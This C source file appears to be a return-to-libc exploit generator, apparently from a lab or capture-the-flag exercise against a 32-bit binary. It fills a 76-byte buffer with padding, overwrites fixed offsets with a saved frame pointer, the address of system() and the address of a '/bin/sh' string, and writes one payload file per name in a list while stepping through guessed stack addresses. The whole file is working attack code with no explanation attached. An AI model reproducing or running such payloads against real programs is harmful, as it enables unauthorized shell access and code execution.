#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main (int argc, char** argv){
    char * line = NULL;
    size_t len = 0;
    ssize_t read;

    int size = 76;
    char buf[size];
    memset(buf, 'A', size);
    *(long *) &buf[60] = 0xffffce78; // ebp
    *(long *) &buf[64] = 0x0804ef70; // system

    FILE * el_list = fopen("./el_list2.txt", "r");

    int i = 0;
    while ((read = getline(&line, &len, el_list)) != -1) {
        printf("Retrieved line of length %zu:\n", read);
    
        // fscanf(el_list, "%[^\n]", c);
        printf("Opening %s\n",line);
        line[read-1]='\0';
        FILE * el = fopen(line, "w");
        *(long *) &buf[68] = 0xffffd100+ i++; // input address
        *(long *) &buf[72] = 0x080bb768; // "/bin/sh"
        fwrite(buf, size, 1, el);
        fclose(el);
    }

    fclose(el_list);

}
